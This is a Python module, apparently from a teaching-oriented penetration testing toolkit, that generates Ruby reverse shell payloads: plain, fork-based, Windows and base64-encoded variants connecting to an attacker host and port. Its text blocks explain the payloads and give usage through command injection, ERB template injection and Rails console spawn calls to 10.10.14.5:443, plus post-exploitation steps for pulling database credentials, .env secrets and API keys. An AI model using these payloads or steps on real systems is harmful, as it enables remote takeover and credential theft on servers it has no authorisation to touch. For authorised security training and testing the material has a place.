"""
Ruby reverse shell payload generator
"""

from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict


class RubyGenerator(PayloadGenerator):
    """Generate Ruby reverse shell payloads."""
    
    def generate(
        self,
        encode: bool = False,
        obfuscate: bool = False
    ) -> str:
        """
        Generate Ruby reverse shell payload.
        
        Args:
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            
        Returns:
            Ruby payload string
        """
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        # Check if logger exists
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Generate payload
        payload = self._generate_reverse_shell()
        
        if encode:
            payload = self.encode_payload(payload, "base64")
            payload = f"ruby -e 'require \"base64\"; eval(Base64.decode64(\"{payload}\"))'"
        
        self.logger.success(
            f"Generated Ruby payload ({len(payload)} bytes)",
            explain="Ruby is elegant and powerful, commonly found on web servers running Rails applications."
        )
        
        return payload
    
    def _generate_reverse_shell(self) -> str:
        """Generate standard Ruby reverse shell."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""ruby -rsocket -e 'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
        return payload
    
    def _generate_no_sh_reverse(self) -> str:
        """Generate Ruby reverse shell without /bin/sh."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        return payload
    
    def _generate_full_reverse(self) -> str:
        """Generate full-featured Ruby reverse shell script."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""ruby -rsocket -e 'c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        return payload
    
    def _generate_windows_reverse(self) -> str:
        """Generate Ruby reverse shell for Windows."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""ruby -rsocket -e 'c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        return payload
    
    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for Ruby payload.
        
        Args:
            target_info: Target information dictionary
            
        Returns:
            True if requirements met
        """
        # Ruby is common on Linux/Unix systems, especially web servers
        os_type = target_info.get('os', '').lower()
        if 'linux' in os_type or 'unix' in os_type or 'bsd' in os_type:
            return True
        
        # Check for Rails/Ruby hints in web server
        web_server = target_info.get('web_server', '').lower()
        if 'passenger' in web_server or 'puma' in web_server or 'unicorn' in web_server:
            return True
        
        # Also check if explicitly detected
        if target_info.get('has_ruby', False):
            return True
        
        # Ruby fairly common on web servers
        return True  # Try anyway
    
    def explain(self, payload: str) -> str:
        """
        Explain Ruby payload line by line.
        
        Args:
            payload: Ruby payload
            
        Returns:
            Educational explanation
        """
        explanation = """
🎓 RUBY REVERSE SHELL EXPLAINED:

Part 1: Import Socket Library
    ruby -rsocket
    The -r flag requires (imports) the socket library.
    This gives us TCPSocket class for network connections.
    Equivalent to: require 'socket'

Part 2: Create TCP Connection
    f = TCPSocket.open("LHOST", LPORT).to_i
    • TCPSocket.open(): Creates TCP connection to your listener
    • .to_i: Converts socket object to file descriptor integer
    • f: File descriptor number for the connection

Part 3: Execute Shell with Redirected I/O
    exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)
    
    Breaking this down:
    • sprintf(): Formats the command string
    • /bin/sh -i: Interactive shell
    • <&%d: Redirect STDIN from file descriptor f
    • >&%d: Redirect STDOUT to file descriptor f  
    • 2>&%d: Redirect STDERR to file descriptor f
    • exec(): Replaces current process with the shell
    
    All three %d are replaced with f (the socket fd).
    Result: All shell I/O goes through the network socket.

ALTERNATIVE METHOD (No /bin/sh):
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new(...)'
    
    This version:
    1. fork: Creates background process
    2. exit if fork: Parent exits, child continues
    3. TCPSocket.new: Creates connection
    4. while(cmd=c.gets): Reads commands from socket
    5. IO.popen(cmd, "r"): Executes command
    6. c.print io.read: Sends output back
    
    Advantages:
    • Doesn't require /bin/sh
    • Works when exec() restricted
    • More flexible command execution

WHY RUBY?
• Elegant, readable syntax
• Powerful object-oriented features
• Common on web servers (Rails apps)
• Good standard library
• Strong in text processing

WHEN TO USE RUBY:
✓ Rails applications
✓ Web servers with Ruby installed
✓ Development/staging servers
✓ Systems with Ruby tooling
✗ Minimal systems
✗ Embedded devices
✗ Windows (unless explicitly installed)

COMMON RUBY LOCATIONS:
• /usr/bin/ruby
• /usr/local/bin/ruby
• /opt/ruby/bin/ruby
• ~/.rbenv/shims/ruby (rbenv)
• ~/.rvm/rubies/*/bin/ruby (RVM)
"""
        return explanation
    
    def generate_variants(self) -> dict:
        """
        Generate multiple Ruby payload variants.
        
        Returns:
            Dict of payload variants
        """
        variants = {}
        
        # Standard with exec
        variants['standard'] = self._generate_reverse_shell()
        
        # No shell version
        variants['no_shell'] = self._generate_no_sh_reverse()
        
        # Full featured
        variants['full'] = self._generate_full_reverse()
        
        # Windows
        variants['windows'] = self._generate_windows_reverse()
        
        # Base64 encoded
        variants['encoded'] = self.generate(encode=True)
        
        return variants
    
    def get_usage_instructions(self) -> str:
        """Get instructions for using Ruby payloads."""
        instructions = """
📋 RUBY PAYLOAD USAGE:

Method 1: Direct One-liner
ruby -rsocket -e 'YOUR_PAYLOAD'

Method 2: From File
echo 'YOUR_PAYLOAD' > shell.rb
ruby shell.rb

Method 3: Command Injection
; ruby -rsocket -e 'f=TCPSocket.open("10.10.14.5",443)...'

Method 4: Rails Console
If you have Rails console access:
require 'socket'
f = TCPSocket.open("10.10.14.5", 443).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)

CHECKING AVAILABILITY:
# Check if Ruby is installed
which ruby
ruby --version

# Check Ruby environment
ruby -e 'puts RUBY_VERSION'
ruby -e 'puts RUBY_PLATFORM'

# Check socket library
ruby -rsocket -e 'puts "Socket OK"'

TIPS:
• -e flag executes inline Ruby code
• -r flag requires a library (like socket)
• Use single quotes to avoid shell interpretation
• Semicolons separate statements

PAYLOAD SELECTION:
Standard: Best for most Linux systems
No Shell: When exec() is restricted
Full: When you need more control
Windows: For Windows with Ruby installed

RAILS APPLICATIONS:
Ruby reverse shells work great on Rails apps:
1. Find code injection point
2. Inject Ruby payload
3. Execute through web request
4. Get shell as web server user

TROUBLESHOOTING:
Issue: "cannot load such file -- socket"
Fix: Socket is built-in, but check Ruby installation

Issue: "Exec format error"
Fix: Wrong shell path, try /bin/bash or /bin/sh

Issue: Connection fails
Fix: Check firewall, try different port

Issue: "fork() not supported"
Fix: Use standard variant instead of no_shell

ADVANTAGES:
• Very readable and maintainable
• Good for Rails applications
• Powerful standard library
• Object-oriented approach
• Active development community

USE CASES:
✓ Rails web applications
✓ Ruby-based services
✓ Development environments
✓ Web servers with Ruby
✓ CI/CD systems using Ruby
"""
        return instructions
    
    def test_availability(self) -> str:
        """Generate command to test if Ruby is available on target."""
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        test_cmd = "which ruby && ruby --version && ruby -rsocket -e 'puts \"Socket available\"'"
        
        self.logger.info(
            "Ruby availability test command generated",
            explain="This checks if Ruby is installed, shows version, and verifies socket library works."
        )
        
        return test_cmd
    
    def get_rails_specific_notes(self) -> str:
        """Get Ruby on Rails specific exploitation notes."""
        notes = """
RUBY ON RAILS EXPLOITATION:

Common Injection Points:
1. eval() calls
2. YAML deserialization
3. Template injection (ERB)
4. ActiveRecord SQL injection
5. Command execution in system calls

Example Rails Console Injection:
If you gain Rails console access:
```ruby
require 'socket'
spawn("ruby -rsocket -e 'f=TCPSocket.open(\"10.10.14.5\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
```

ERB Template Injection:
<%= `ruby -rsocket -e 'YOUR_PAYLOAD'` %>

YAML Deserialization:
Some Ruby YAML vulnerabilities allow code execution.
Check for unsafe YAML.load() usage.

Rails Environment Variables:
RAILS_ENV=production ruby payload.rb
RACK_ENV=production ruby payload.rb

User Context:
Rails apps typically run as:
• www-data (Ubuntu/Debian)
• nginx (CentOS/RHEL)
• rails (custom user)

Post-Exploitation:
1. Check database.yml for DB credentials
2. Look for .env files with secrets
3. Check config/secrets.yml
4. Review config/credentials.yml.enc
5. Search for API keys in config/

Rails Specific Paths:
• /var/www/app/
• /home/deploy/app/
• /opt/app/
• /srv/app/
"""
        return notes
